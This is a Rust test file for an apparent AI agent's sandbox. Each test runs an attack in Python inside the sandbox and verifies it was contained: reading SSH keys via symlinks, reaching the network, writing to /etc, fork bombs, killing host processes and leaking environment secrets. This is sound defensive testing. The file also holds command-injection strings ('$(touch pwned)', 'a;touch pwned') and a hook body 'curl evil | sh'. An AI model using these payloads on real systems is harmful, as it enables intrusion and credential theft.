#![allow(clippy::unwrap_used)]
//! The jail against hostile programs. Every test here RUNS the attack inside the jail and then
//! checks from outside that it did not work. The jail needs unprivileged user namespaces; where
//! the kernel does not allow them every test prints `SKIPPED` and returns (it does not pass in
//! silence: see the message; set `CLIO_REQUIRE_JAIL=1` to make a missing jail a failure, as a CI
//! job that is known to support it should).
//!
//! The scenarios are plain functions returning `Some(true)` when the attack was stopped,
//! `Some(false)` when it got through, `None` when skipped. They are the scenarios of the attack
//! cases 24 to 33 (`testing/attacks/cases`) and are also run through `clio-attacks`.

use std::os::unix::fs::symlink;
use std::path::Path;
use std::sync::OnceLock;
use std::time::Duration;

use clio_attacks::{Case, Observed, Status, Target, load_cases, run};
use clio_canaries::Canaries;
use clio_node::jail::{Jail, JailOutput, Job, Limits};
use clio_node::{Registry, Sandbox, run_tests_tool};
use serde_json::json;
use tempfile::TempDir;

const PY: &str = "/usr/bin/python3";

/// The jail if it can run here; `None` (with a visible message) if not.
fn jail() -> Option<Jail> {
    static J: OnceLock<Result<Jail, String>> = OnceLock::new();
    let r = J.get_or_init(|| {
        let mut j = Jail::detect()?;
        j.probe()?;
        j.limits.timeout = Duration::from_secs(20);
        Ok(j)
    });
    match r {
        Ok(j) => Some(j.clone()),
        Err(why) => {
            assert!(
                std::env::var_os("CLIO_REQUIRE_JAIL").is_none(),
                "CLIO_REQUIRE_JAIL is set and the jail is not available: {why}"
            );
            eprintln!("SKIPPED (the jail cannot run on this machine, nothing was tested): {why}");
            None
        }
    }
}

fn py(j: &Jail, work: &Path, code: &str) -> JailOutput {
    py_with(j, work, code, |_| {})
}

fn py_with(j: &Jail, work: &Path, code: &str, edit: impl FnOnce(&mut Job)) -> JailOutput {
    let mut job = Job {
        work: work.to_path_buf(),
        argv: vec![PY.into(), "-c".into(), code.into()],
        env: vec![("PYTHONDONTWRITEBYTECODE".into(), "1".into())],
        ..Job::default()
    };
    edit(&mut job);
    j.run(&job).unwrap()
}

fn nonce() -> String {
    format!(
        "n{}x{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    )
}

/// Host processes whose command line mentions `marker`.
fn host_procs_with(marker: &str) -> usize {
    std::fs::read_dir("/proc")
        .unwrap()
        .filter_map(Result::ok)
        .filter(|e| {
            std::fs::read(e.path().join("cmdline"))
                .is_ok_and(|c| String::from_utf8_lossy(&c).contains(marker))
        })
        .count()
}

/// A fake person's home with a decoy key, and a working folder, side by side in a temp dir.
struct Fixture {
    _t: TempDir,
    home: std::path::PathBuf,
    work: std::path::PathBuf,
    canaries: Canaries,
}

fn fixture() -> Fixture {
    let t = tempfile::tempdir().unwrap();
    let (home, work) = (t.path().join("home"), t.path().join("work"));
    std::fs::create_dir_all(home.join(".ssh")).unwrap();
    std::fs::create_dir_all(&work).unwrap();
    let canaries = Canaries::fresh();
    std::fs::write(home.join(".ssh/id_ed25519"), canaries.value("ssh").unwrap()).unwrap();
    std::fs::write(home.join("decoy.txt"), canaries.value("github").unwrap()).unwrap();
    Fixture {
        _t: t,
        home,
        work,
        canaries,
    }
}

// ------------------------------------------------------------------------------------------
// Scenarios
// ------------------------------------------------------------------------------------------

/// 24: read `~/.ssh` and a decoy in the home, directly and through symlinks inside the folder.
fn attack_24() -> Option<bool> {
    let j = jail()?;
    let f = fixture();
    symlink(f.home.join(".ssh"), f.work.join("ssh_link")).unwrap();
    symlink(f.home.join(".ssh/id_ed25519"), f.work.join("key_link")).unwrap();
    symlink(&f.home, f.work.join("home_link")).unwrap();
    symlink("../home/decoy.txt", f.work.join("relative_link")).unwrap();
    let code = format!(
        r#"
import os
paths = ["{h}/.ssh/id_ed25519", "{h}/decoy.txt", "/work/ssh_link/id_ed25519", "/work/key_link",
         "/work/home_link/decoy.txt", "/work/relative_link"]
for p in paths:
    try:
        print("READ", p, open(p).read())
    except OSError as e:
        print("DENIED", p, e.errno)
for d in ["{h}", "{h}/.ssh", "/work/ssh_link", "/work/home_link"]:
    try:
        print("LIST", d, os.listdir(d))
    except OSError as e:
        print("DENIED", d, e.errno)
"#,
        h = f.home.display()
    );
    let out = py(&j, &f.work, &code);
    let all = format!("{}{}", out.stdout, out.stderr);
    let denied = all.lines().filter(|l| l.starts_with("DENIED")).count();
    Some(
        out.success()
            && denied == 10
            && !all.contains("READ")
            && !all.contains("LIST")
            && f.canaries.scan("jail output", &all).is_empty(),
    )
}

/// 25: a network connection (TCP to a host port, UDP, DNS, the host's abstract unix socket).
fn attack_25() -> Option<bool> {
    let j = jail()?;
    let f = fixture();
    let tcp = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    tcp.set_nonblocking(true).unwrap();
    let udp = std::net::UdpSocket::bind("127.0.0.1:0").unwrap();
    udp.set_nonblocking(true).unwrap();
    let code = format!(
        r#"
import socket
tries = [
    ("tcp", lambda: socket.create_connection(("127.0.0.1", {tcp}), 3)),
    ("tcp-any", lambda: socket.create_connection(("93.184.216.34", 80), 3)),
    ("dns", lambda: socket.getaddrinfo("example.com", 80)),
]
for name, f in tries:
    try:
        f(); print("CONNECTED", name)
    except OSError as e:
        print("DENIED", name, e)
# UDP never "connects": the datagram goes to the jail's own loopback; the host must not get it.
socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"x", ("127.0.0.1", {udp}))
print("INTERFACES", [i[1] for i in socket.if_nameindex()])
"#,
        tcp = tcp.local_addr().unwrap().port(),
        udp = udp.local_addr().unwrap().port()
    );
    let out = py(&j, &f.work, &code);
    let mut buf = [0u8; 8];
    let ok = out.success()
        && !out.stdout.contains("CONNECTED")
        && out.stdout.matches("DENIED").count() == 3
        && out.stdout.contains("INTERFACES ['lo']")
        && tcp.accept().is_err()
        && udp.recv(&mut buf).is_err();
    if !ok {
        eprintln!("attack 25 output: {out:?}");
    }
    Some(ok)
}

/// 26: write in `/usr`, in `/etc`, in the root, in the person's home (a stand-in folder).
fn attack_26() -> Option<bool> {
    let j = jail()?;
    let f = fixture();
    let code = format!(
        r#"
import os
for p in ["/usr/escape", "/usr/bin/escape", "/etc/escape", "/escape", "{h}/escape", "{h}/.ssh/authorized_keys"]:
    try:
        open(p, "w").write("x"); print("WROTE", p)
    except OSError as e:
        print("DENIED", p, e.errno)
for p in ["/usr/bin/python3", "/usr/bin"]:
    try:
        os.chmod(p, 0o777); print("CHMOD", p)
    except OSError as e:
        print("DENIED chmod", p, e.errno)
open("/work/ok", "w").write("in work")
open("/tmp/ok", "w").write("in tmp")
print("CONTROL ok")
"#,
        h = f.home.display()
    );
    let out = py(&j, &f.work, &code);
    Some(
        out.success()
            && !out.stdout.contains("WROTE")
            && !out.stdout.contains("CHMOD")
            && out.stdout.contains("CONTROL ok")
            && !f.home.join("escape").exists()
            && !f.home.join(".ssh/authorized_keys").exists()
            && std::fs::read_to_string(f.work.join("ok")).unwrap() == "in work"
            && !Path::new("/usr/escape").exists(),
    )
}

/// 27: a process bomb stops at the process limit, and nothing survives it.
fn attack_27() -> Option<bool> {
    let j = jail()?;
    let f = fixture();
    let marker = nonce();
    let code = format!(
        r#"
import os, time
# {marker}
n, err = 0, None
for i in range(5000):
    try:
        pid = os.fork()
    except OSError as e:
        err = e.errno
        break
    if pid == 0:
        time.sleep(30)
        os._exit(0)
    n += 1
print("FORKED", n, "ERRNO", err)
"#
    );
    let out = py(&j, &f.work, &code);
    let forked: u64 = out
        .stdout
        .split_whitespace()
        .nth(1)
        .and_then(|n| n.parse().ok())
        .unwrap_or(u64::MAX);
    std::thread::sleep(Duration::from_millis(300));
    Some(
        out.success()
            && forked < j.limits.procs
            && out.stdout.contains("ERRNO 11") // EAGAIN: the limit, not luck
            && host_procs_with(&marker) == 0,
    )
}

/// 28: an infinite loop dies at the time limit, and so does a daemon it left behind.
fn attack_28() -> Option<bool> {
    let j = jail()?;
    let f = fixture();
    let code = r#"
import os, time
if os.fork() == 0:
    os.setsid()
    if os.fork() == 0:
        while True:
            open("/work/beat", "w").write(str(time.time()))
            time.sleep(0.05)
    os._exit(0)
while True:
    pass
"#;
    let out = py_with(&j, &f.work, code, |job| {
        job.limits = Some(Limits {
            timeout: Duration::from_millis(1500),
            ..j.limits.clone()
        });
    });
    let beat = || std::fs::metadata(f.work.join("beat")).and_then(|m| m.modified());
    let before = beat().ok();
    std::thread::sleep(Duration::from_millis(500));
    let after = beat().ok();
    Some(out.timed_out && out.elapsed_ms < 8_000 && before.is_some() && before == after)
}

/// 29: a flood of output is cut and the command is stopped.
fn attack_29() -> Option<bool> {
    let j = jail()?;
    let f = fixture();
    let code = r#"
import sys
sys.stderr.write("E" * 100000)
while True:
    sys.stdout.write("A" * 65536)
    sys.stdout.flush()
"#;
    let out = py_with(&j, &f.work, code, |job| {
        job.limits = Some(Limits {
            max_output: 4096,
            ..j.limits.clone()
        });
    });
    Some(
        out.flooded
            && out.truncated
            && out.stdout.len() <= 4096
            && out.stderr.len() <= 4096
            && out.elapsed_ms < 15_000,
    )
}

/// 30: see and kill other processes (a host process, and the launcher's own pid).
fn attack_30() -> Option<bool> {
    let j = jail()?;
    let f = fixture();
    let victim = std::process::Command::new("/usr/bin/sleep")
        .arg("120")
        .spawn()
        .unwrap();
    struct Reap(std::process::Child);
    impl Drop for Reap {
        fn drop(&mut self) {
            let _ = self.0.kill();
            let _ = self.0.wait();
        }
    }
    let pid = victim.id();
    let me = std::process::id();
    let mut guard = Reap(victim);
    let code = format!(
        r#"
import os, signal
pids = [int(x) for x in os.listdir("/proc") if x.isdigit()]
print("VISIBLE", pids)
for target in [{pid}, {me}]:
    for sig in [0, signal.SIGTERM, signal.SIGKILL]:
        try:
            os.kill(target, sig); print("SIGNALED", target, sig)
        except OSError as e:
            print("DENIED", target, sig, e.errno)
try:
    print("CMDLINE", open("/proc/{pid}/cmdline").read())
except OSError as e:
    print("DENIED cmdline", e.errno)
"#
    );
    let out = py(&j, &f.work, &code);
    let alive = matches!(guard.0.try_wait(), Ok(None));
    let ok = out.success()
        && !out.stdout.contains("SIGNALED")
        && !out.stdout.contains("CMDLINE")
        && out.stdout.matches("DENIED").count() == 7
        && alive;
    Some(ok)
}

/// 31: variables of the caller (keys, the ssh agent socket) do not exist inside. The test binary
/// runs itself again with decoy keys in its REAL environment; that child (`child_env_probe`)
/// runs the jail, which is what a `clio` process with `OPENCODE_API_KEY` set does.
fn attack_31() -> Option<bool> {
    jail()?;
    let f = fixture();
    let c = &f.canaries;
    let mut bait: Vec<(String, String)> = c
        .names()
        .map(|n| {
            (
                format!("CLIO_BAIT_{}", n.to_uppercase().replace('-', "_")),
                c.value(n).unwrap().to_owned(),
            )
        })
        .collect();
    bait.push((
        "OPENCODE_API_KEY".into(),
        c.value("llm-provider").unwrap().into(),
    ));
    bait.push((
        "SSH_AUTH_SOCK".into(),
        "/run/user/1000/ssh-agent.socket".into(),
    ));
    bait.push(("HOME".into(), "/home/someone".into()));
    let report = f.work.parent().unwrap().join("child-report.txt");
    let me = std::env::current_exe().unwrap();
    let child = std::process::Command::new(me)
        .args([
            "--exact",
            "child_env_probe",
            "--nocapture",
            "--test-threads=1",
        ])
        .env_clear()
        .envs(bait.iter().cloned())
        .env("CLIO_JAIL_CHILD_OUT", &report)
        .env("CLIO_JAIL_CHILD_WORK", &f.work)
        .output()
        .unwrap();
    let child_said = String::from_utf8_lossy(&child.stdout).into_owned();
    let all = std::fs::read_to_string(&report).unwrap_or_default();
    Some(
        child.status.success()
            && all.contains("CHILD-ENV-CONTROL ok") // the decoys were in the caller's own env
            && all.contains("ENV ")
            && c.scan("jail output", &all).is_empty()
            && c.scan("child output", &child_said).is_empty()
            && !all.contains("SSH_AUTH_SOCK")
            && !all.contains("OPENCODE_API_KEY")
            && !all.contains("CLIO_BAIT")
            && !all.contains("/home/someone")
            && all.contains("HOMEVAR /tmp/home"),
    )
}

/// Only does something when `attack_31` launches it: the child with decoys in its environment.
#[test]
fn child_env_probe() {
    let (Some(out), Some(work)) = (
        std::env::var_os("CLIO_JAIL_CHILD_OUT"),
        std::env::var_os("CLIO_JAIL_CHILD_WORK"),
    ) else {
        return;
    };
    let j = jail().unwrap();
    let mut text = String::new();
    if std::env::var("OPENCODE_API_KEY").is_ok() && std::env::var("SSH_AUTH_SOCK").is_ok() {
        text.push_str("CHILD-ENV-CONTROL ok\n");
    }
    let code = r#"
import os, glob
print("ENV", sorted(os.environ.items()))
for p in glob.glob("/proc/[0-9]*/environ"):
    try:
        print("PROC", p, open(p).read().replace("\0", " "))
    except OSError:
        pass
print("HOMEVAR", os.environ.get("HOME"))
"#;
    let o = py(&j, Path::new(&work), code);
    text.push_str(&o.stdout);
    text.push_str(&o.stderr);
    std::fs::write(out, text).unwrap();
}

/// 32: hostile `target`s never reach a command line: nothing runs and nothing is created.
fn attack_32() -> Option<bool> {
    let t = tempfile::tempdir().unwrap();
    let (work, scratch, outside) = (
        t.path().join("work"),
        t.path().join("s"),
        t.path().join("o"),
    );
    std::fs::create_dir_all(&work).unwrap();
    std::fs::create_dir_all(&outside).unwrap();
    std::fs::write(outside.join("test_o.py"), "raise SystemExit(0)").unwrap();
    symlink(&outside, work.join("link_out")).unwrap();
    symlink("/etc/passwd", work.join("link_abs")).unwrap();
    let s = Sandbox::new(&work, &scratch).unwrap();
    let tool = run_tests_tool();
    let hostile = [
        "--foo",
        "-m",
        "--help",
        "../x",
        "a/../../x",
        "a;b",
        "a;touch pwned",
        "$(touch pwned)",
        "`touch pwned`",
        "a b",
        "a|b",
        "a&&b",
        "a\nb",
        "/etc/passwd",
        "/work",
        "~/x",
        "link_out",
        "link_out/test_o.py",
        "link_abs",
        "does_not_exist.py",
        "",
    ];
    let mut refused = 0;
    for target in hostile {
        let r = (tool.run)(&s, &json!({"runner": "unittest", "target": target}));
        let rp = (tool.run)(&s, &json!({"runner": "pytest", "target": target}));
        refused += usize::from(r.is_err() && rp.is_err());
    }
    let bad_args = [
        json!({"runner": "sh"}),
        json!({"runner": "cargo_test"}),
        json!({"runner": "unittest; id"}),
        json!({"runner": "python3 -c x"}),
        json!({}),
        json!({"runner": "unittest", "cmd": "id"}),
        json!({"runner": "unittest", "target": ["a"]}),
        json!({"runner": "unittest", "target": 5}),
        json!("unittest"),
    ];
    let args_refused = bad_args.iter().all(|a| (tool.run)(&s, a).is_err());
    Some(
        refused == hostile.len()
            && args_refused
            && !work.join("pwned").exists()
            && !work.join("b").exists()
            && std::fs::read_dir(&work).unwrap().count() == 2,
    )
}

/// 33: a program that edits a file in place cannot corrupt the snapshot (copy snapshots), and
/// `restore` still brings the original back. The default hard-link snapshot WOULD be corrupted.
fn attack_33() -> Option<bool> {
    let j = jail()?;
    let t = tempfile::tempdir().unwrap();
    let (work, scratch) = (t.path().join("work"), t.path().join("s"));
    std::fs::create_dir_all(&work).unwrap();
    let original = "def test():\n    assert True\n";
    let evil = "def test():\n    assert False  # rewritten in place\n";
    let code = r#"
f = open("/work/test_a.py", "r+")
f.seek(0)
f.write("def test():\n    assert False  # rewritten in place\n")
f.truncate()
f.close()
"#;
    let attempt = |copy: bool, dir: &str| {
        let w = work.join(dir);
        std::fs::create_dir_all(&w).unwrap();
        std::fs::write(w.join("test_a.py"), original).unwrap();
        let mut s = Sandbox::new(&w, &scratch.join(dir)).unwrap();
        s.set_copy_snapshots(copy);
        let snap = s.snapshot().unwrap();
        let out = py(&j, &w, code);
        let changed = std::fs::read_to_string(w.join("test_a.py")).unwrap() == evil;
        s.restore(&snap).unwrap();
        let restored = std::fs::read_to_string(w.join("test_a.py")).unwrap();
        (out.success() && changed, restored)
    };
    let (wrote_a, restored_copy) = attempt(true, "copy");
    // The hole the copy mode closes: with hard links, restore "restores" the corrupted file.
    let (wrote_b, restored_link) = attempt(false, "link");
    Some(wrote_a && restored_copy == original && wrote_b && restored_link == evil)
}

// ------------------------------------------------------------------------------------------
// The attack cases through clio-attacks (the cases that live in this crate)
// ------------------------------------------------------------------------------------------

const OURS: [&str; 10] = [
    "attack-24",
    "attack-25",
    "attack-26",
    "attack-27",
    "attack-28",
    "attack-29",
    "attack-30",
    "attack-31",
    "attack-32",
    "attack-33",
];

struct JailTarget;

impl Target for JailTarget {
    fn attack(&self, case: &Case) -> Observed {
        let refused = match case.id.as_str() {
            "attack-24" => attack_24(),
            "attack-25" => attack_25(),
            "attack-26" => attack_26(),
            "attack-27" => attack_27(),
            "attack-28" => attack_28(),
            "attack-29" => attack_29(),
            "attack-30" => attack_30(),
            "attack-31" => attack_31(),
            "attack-32" => attack_32(),
            "attack-33" => attack_33(),
            other => panic!("{other} is active but the jail target has no scenario for it"),
        };
        Observed {
            refused: refused.expect("checked before the run"),
        }
    }
}

fn cases() -> Vec<Case> {
    load_cases(&Path::new(env!("CARGO_MANIFEST_DIR")).join("../../testing/attacks/cases")).unwrap()
}

#[test]
fn the_jail_cases_are_active_and_refused() {
    // Attack 32 needs no jail to be refused, but its checks include the runner's own probes.
    let mine: Vec<Case> = cases()
        .into_iter()
        .filter(|c| OURS.contains(&c.id.as_str()))
        .collect();
    assert_eq!(
        mine.len(),
        OURS.len(),
        "a jail case is missing in testing/attacks/cases"
    );
    assert!(mine.iter().all(|c| c.status == Status::Active));
    if jail().is_none() {
        return; // jail() already said SKIPPED
    }
    let report = run(&mine, &JailTarget);
    assert!(report.ok(), "{}", report.line());
    assert_eq!(report.passed.len(), OURS.len());
    eprintln!("{}", report.line());
}

macro_rules! scenario {
    ($name:ident, $f:ident) => {
        #[test]
        fn $name() {
            if let Some(stopped) = $f() {
                assert!(stopped, "{} got through", stringify!($f));
            }
        }
    };
}

// S-03 S-13
scenario!(
    a_24_the_persons_files_are_not_there_even_through_symlinks,
    attack_24
);
// S-03 S-12
scenario!(a_25_there_is_no_network, attack_25);
// S-03
scenario!(a_26_nothing_outside_work_can_be_written, attack_26);
// S-47
scenario!(a_27_a_process_bomb_stops_at_the_limit, attack_27);
// S-47
scenario!(a_28_an_infinite_loop_dies_with_its_daemons, attack_28);
// S-47
scenario!(a_29_a_flood_of_output_is_cut, attack_29);
// S-03 S-39
scenario!(a_30_other_processes_cannot_be_seen_or_killed, attack_30);
// S-03 S-20
scenario!(a_31_the_environment_of_the_caller_does_not_pass, attack_31);
// S-12 S-13
scenario!(a_32_hostile_targets_never_reach_a_command, attack_32);
// S-14
scenario!(
    a_33_editing_in_place_does_not_corrupt_the_snapshot,
    attack_33
);

// ------------------------------------------------------------------------------------------
// The self-test, the argv, the limits and the tool itself
// ------------------------------------------------------------------------------------------

// S-03
#[test]
fn the_self_test_passes_every_check_in_a_working_jail() {
    let Some(j) = jail() else { return };
    let st = j.self_test().unwrap();
    for c in &st.checks {
        eprintln!(
            "{} {}: {}",
            if c.passed { "PASS" } else { "FAIL" },
            c.name,
            c.detail
        );
    }
    assert!(st.ok(), "{:#?}", st.checks);
    assert!(st.checks.len() >= clio_node::CHECKS.len() - 1);
    // The decoy this process planted in the real home is gone (other processes' decoys may exist).
    if let Some(h) = std::env::var_os("HOME") {
        let left = std::fs::read_dir(h)
            .map(|d| {
                d.filter_map(Result::ok)
                    .filter(|e| {
                        e.file_name()
                            .to_string_lossy()
                            .starts_with(&format!(".clio-jail-decoy-{}-", std::process::id()))
                    })
                    .count()
            })
            .unwrap_or(0);
        assert_eq!(left, 0);
    }
}

#[test]
fn the_argv_has_no_shell_and_every_isolation_flag() {
    let Ok(j) = Jail::detect() else {
        eprintln!("SKIPPED: bwrap or prlimit missing");
        return;
    };
    let f = fixture();
    let job = Job {
        work: f.work.clone(),
        argv: vec![PY.into(), "-m".into(), "unittest".into()],
        read_only: vec![".git".into()],
        ..Job::default()
    };
    let a = j.bwrap_args(&job).unwrap();
    for flag in [
        "--unshare-all",
        "--unshare-user",
        "--unshare-cgroup",
        "--disable-userns",
        "--die-with-parent",
        "--new-session",
        "--clearenv",
        "--remount-ro",
    ] {
        assert!(a.iter().any(|x| x == flag), "{flag} missing in {a:?}");
    }
    assert!(!a.iter().any(|x| x == "--share-net" || x == "--bind-try"));
    for shell in ["sh", "bash", "-c"] {
        assert!(
            !a.iter().any(|x| x == shell || x.ends_with("/sh")),
            "{shell}"
        );
    }
    // The only writable mount of the host is the working folder.
    let binds: Vec<&String> = a
        .windows(3)
        .filter(|w| w[0] == "--bind")
        .map(|w| &w[1])
        .collect();
    assert_eq!(binds.len(), 1);
    assert_eq!(a.last().unwrap(), "unittest");
    assert!(
        j.bwrap_args(&Job {
            argv: vec!["python3".into()],
            ..job
        })
        .is_err()
    );
}

#[test]
fn a_missing_tool_fails_closed_with_a_clear_message() {
    // `detect` looks only in the system folders; a name that is not there is an error, and
    // `run` of a jail that cannot start is an `Err`, never a run with less jail.
    let Some(j) = jail() else { return };
    let out = j
        .run(&Job {
            work: std::env::temp_dir(),
            argv: vec!["/usr/bin/this-does-not-exist".into()],
            ..Job::default()
        })
        .unwrap();
    assert!(!out.success());
    let err = j
        .run(&Job {
            work: "/definitely/not/a/folder".into(),
            argv: vec![PY.into()],
            ..Job::default()
        })
        .unwrap_err();
    assert!(err.contains("working folder"), "{err}");
}

#[test]
fn the_tmp_tmpfs_has_a_size_limit() {
    let Some(j) = jail() else { return };
    let f = fixture();
    let code = r#"
import errno
done = 0
try:
    for i in range(40):
        open("/tmp/f%d" % i, "wb").write(b"x" * (4 << 20))
        done += 1
    print("FILLED", done)
except OSError as e:
    print("STOPPED", done, e.errno)
"#;
    let out = py_with(&j, &f.work, code, |job| {
        job.limits = Some(Limits {
            tmp_bytes: 32 << 20,
            ..j.limits.clone()
        });
    });
    assert!(out.stdout.contains("STOPPED"), "{}", out.stdout);
}

#[test]
fn a_memory_hog_is_stopped_by_the_address_space_limit() {
    let Some(j) = jail() else { return };
    let f = fixture();
    let out = py_with(
        &j,
        &f.work,
        "x = bytearray(6 << 30)\nprint('ALLOCATED')",
        |job| {
            job.limits = Some(Limits {
                mem_bytes: 1 << 30,
                ..j.limits.clone()
            });
        },
    );
    assert!(!out.stdout.contains("ALLOCATED"));
    assert!(out.stderr.contains("MemoryError"), "{}", out.stderr);
}

fn project(files: &[(&str, &str)]) -> (TempDir, Sandbox) {
    let t = tempfile::tempdir().unwrap();
    let work = t.path().join("work");
    std::fs::create_dir_all(&work).unwrap();
    for (n, c) in files {
        let p = work.join(n);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, c).unwrap();
    }
    let s = Sandbox::new(&work, &t.path().join("scratch")).unwrap();
    (t, s)
}

#[test]
fn run_tests_reports_pass_fail_and_no_tests_and_leaves_no_bytecode() {
    if jail().is_none() {
        return;
    }
    let (_t, s) = project(&[
        ("calc.py", "def add(a, b):\n    return a + b\n"),
        (
            "test_calc.py",
            "import unittest, calc\nclass T(unittest.TestCase):\n    def test_add(self):\n        self.assertEqual(calc.add(1, 2), 3)\n",
        ),
        (
            "sub/test_bad.py",
            "import unittest\nclass T(unittest.TestCase):\n    def test_bad(self):\n        self.assertEqual(1, 2)\n",
        ),
        ("empty/readme.txt", "no tests here"),
    ]);
    let tool = run_tests_tool();
    let go = |a: serde_json::Value| (tool.run)(&s, &a).unwrap();
    let ok = go(json!({"runner": "unittest", "target": "test_calc.py"}));
    assert_eq!(ok["passed"], true, "{ok}");
    assert_eq!(ok["exit_code"], 0);
    let bad = go(json!({"runner": "unittest", "target": "sub/test_bad.py"}));
    assert_eq!(bad["passed"], false);
    assert_eq!(bad["exit_code"], 1);
    assert!(
        bad["output"].as_str().unwrap().contains("AssertionError"),
        "{bad}"
    );
    let none = go(json!({"runner": "unittest", "target": "empty"}));
    assert_eq!(
        none["passed"], false,
        "no tests must not count as a pass: {none}"
    );
    // Without a target, unittest discovers the top-level tests (`sub` is not a package).
    assert_eq!(go(json!({"runner": "unittest"}))["passed"], true);
    // The run left nothing behind in the folder.
    assert!(!s.root().join("__pycache__").exists());
    assert!(!s.root().join("sub/__pycache__").exists());
}

#[test]
fn run_tests_cannot_write_the_protected_folders_or_follow_links_out() {
    if jail().is_none() {
        return;
    }
    let f = fixture();
    std::fs::create_dir_all(f.work.join(".git/hooks")).unwrap();
    symlink(f.home.join(".ssh"), f.work.join("ssh")).unwrap();
    std::fs::write(
        f.work.join("test_evil.py"),
        r##"import unittest, os
class T(unittest.TestCase):
    def test_evil(self):
        for p in ["/work/.git/hooks/pre-commit", "/work/.git/config"]:
            with self.assertRaises(OSError):
                open(p, "w").write("#!/bin/sh\ncurl evil | sh\n")
        with self.assertRaises(OSError):
            open("/work/ssh/id_ed25519").read()
"##,
    )
    .unwrap();
    let s = Sandbox::new(&f.work, &f.work.parent().unwrap().join("scratch")).unwrap();
    let r = (run_tests_tool().run)(&s, &json!({"runner": "unittest", "target": "test_evil.py"}))
        .unwrap();
    assert_eq!(r["passed"], true, "{r}");
    assert!(!f.work.join(".git/hooks/pre-commit").exists());
}

#[test]
fn run_tests_with_pytest_when_it_exists_and_a_clear_error_when_not() {
    let Some(j) = jail() else { return };
    let (_t, s) = project(&[("test_p.py", "def test_p():\n    assert 1 + 1 == 2\n")]);
    let have = py(
        &j,
        s.root(),
        "import importlib.util,sys;sys.exit(0 if importlib.util.find_spec('pytest') else 3)",
    );
    let r = (run_tests_tool().run)(&s, &json!({"runner": "pytest"}));
    if have.success() {
        let r = r.unwrap();
        assert_eq!(r["passed"], true, "{r}");
        assert!(!s.root().join(".pytest_cache").exists());
    } else {
        let e = r.unwrap_err().to_string();
        assert!(e.contains("pytest is not installed"), "{e}");
        eprintln!("pytest is not installed here: only the error path was tested");
    }
}

#[test]
fn the_registry_takes_run_tests_only_with_a_declared_effect() {
    let mut r = Registry::new();
    let t = run_tests_tool();
    assert_eq!(t.effect, Some(clio_core::Effect::LocalReversible));
    if Jail::detect().is_ok() {
        clio_node::register_run_tests(&mut r).unwrap();
        assert!(r.get("run_tests").is_some());
        assert!(r.visible().iter().any(|t| t.name == "run_tests"));
    } else {
        assert!(clio_node::register_run_tests(&mut r).is_err());
    }
}
